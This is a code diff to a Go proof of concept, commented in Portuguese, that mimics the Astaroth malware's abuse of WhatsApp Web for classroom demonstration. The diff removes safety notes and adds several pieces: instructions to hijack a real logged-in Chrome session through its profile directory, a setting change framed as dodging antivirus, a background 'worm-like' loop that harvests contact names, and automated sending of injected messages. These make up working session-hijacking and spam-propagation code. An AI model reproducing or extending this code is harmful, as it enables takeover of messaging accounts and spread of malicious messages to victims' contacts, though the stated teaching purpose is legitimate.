@@ -35,14 +35,15 @@ func main() {
 	l := launcher.New().
 		Headless(false). // Deixa o navegador visível para o aluno
 		Devtools(true).
-		Leakless(false) // DESATIVADO: O 'leakless' ajuda a limpar processos, mas o Windows Defender costuma pará-lo como falso positivo.
+		Leakless(false) // DESATIVADO: Para evitar bloqueio de antivírus
 
 	/*
-	   DICA PARA AULA (Sessão Logada):
-	   - O malware Astaroth (vbiud.py) USA a sessão logada apontando para: .UserDataDir(caminho_do_perfil)
-	   - Nesta POC, NÃO usamos .UserDataDir(). Isso cria um perfil temporário limpo.
-	   - Isso obriga o scan do QR Code, o que é mais SEGURO para uma demonstração em aula.
+	   DICA PARA AULA (Sessão Logada / Session Hijacking):
+	   - Para usar sua sessão real do Chrome (e pular o QR Code), descomente a linha abaixo
+	     e altere 'SeuUsuario' para o nome do seu usuário Windows.
+	   - IMPORTANTE: O Chrome deve estar COMPLETAMENTE FECHADO antes de rodar o script.
 	*/
+	// l.UserDataDir("C:\\Users\\SeuUsuario\\AppData\\Local\\Google\\Chrome\\User Data")
 
 	url := l.MustLaunch()
 
@@ -53,49 +54,61 @@ func main() {
 	// Abre o WhatsApp Web
 	page := browser.MustPage(WhatsAppURL)
 
-	fmt.Println("[!] Por favor, escaneie o QR Code no navegador...")
+	fmt.Println("[!] Por favor, escaneie o QR Code no navegador (ou use a sessão logada)...")
 
 	// Aguarda o login detectando a lista de conversas
-	// O malware usaria seletores internos mais complexos ou WA-JS
 	page.MustElement("[data-testid='chat-list']").MustWaitVisible()
 	fmt.Println("[+] Login detectado com sucesso!")
 
 	// Pequena pausa para garantir carregamento total
 	time.Sleep(2 * time.Second)
 
-	// Listagem dos primeiros contatos (POC)
-	fmt.Println("[*] Coletando os primeiros contatos visíveis...")
-	// Buscamos elementos que possuem o atributo 'title', comum para nomes de contatos
-	elements := page.MustElements("span[title]")
+	// --- INÍCIO DA CAPACIDADE REAL-TIME (WORM-LIKE) ---
+	fmt.Println("[*] Iniciando monitoramento em tempo real (Goroutines)...")
+	seenNames := make(map[string]bool)
 
-	names := make(map[string]bool)
-	fmt.Println("\n--- Lista de Contatos Coletada (POC Go) ---")
-	count := 0
-	for _, el := range elements {
+	// Coleta inicial para não repetir o que já está na tela
+	initialElements := page.MustElements("span[title]")
+	for _, el := range initialElements {
 		name := el.MustText()
-		if name != "" && !names[name] {
-			names[name] = true
-			count++
-			fmt.Printf("%d. %s\n", count, name)
-		}
-		if count >= MaxContactsToList {
-			break
+		if name != "" {
+			seenNames[name] = true
 		}
 	}
-	fmt.Println("-------------------------------------------\n")
+
+	// Goroutine que monitora novos contatos em segundo plano
+	go func() {
+		for {
+			time.Sleep(3 * time.Second) // Escaneia a cada 3 segundos
+
+			elements := page.MustElements("span[title]")
+			for _, el := range elements {
+				name, err := el.Text()
+				if err != nil || name == "" {
+					continue
+				}
+
+				if !seenNames[name] {
+					seenNames[name] = true
+					fmt.Printf("\a\n[REAL-TIME] Novo contato/atividade detectada: %s\n", name)
+					fmt.Print("[!] Pressione ENTER para simular injeção no chat selecionado...")
+				}
+			}
+		}
+	}()
+	// --- FIM DA CAPACIDADE REAL-TIME ---
 
 	// Demonstração de injeção de mensagem
-	fmt.Println("[!] Demonstração: Selecione um chat no navegador e pressione ENTER aqui para simular a injeção.")
+	fmt.Println("\n[!] Demonstração: Selecione um chat no navegador e pressione ENTER aqui para simular a injeção.")
+	fmt.Print("[-] (O monitoramento continua rodando em segundo plano enquanto você decide...)\n")
+
 	var inputStr string
 	fmt.Scanln(&inputStr)
 
 	// Busca a caixa de texto (contenteditable)
-	// O seletor 'div[contenteditable="true"]' é o padrão do WPP Web para a área de digitação
 	chatBox := page.MustElement("div[contenteditable='true'][data-tab='10']")
 	chatBox.MustClick().MustInput(TestMessage)
 
-	// O malware dispararia o evento de 'Enter' ou usaria WPP.chat.send()
-	// Aqui apenas injetamos o texto para demonstrar a capacidade
 	chatBox.MustType(input.Enter)
 
 	fmt.Printf("[+] Mensagem injetada: %s\n", TestMessage)
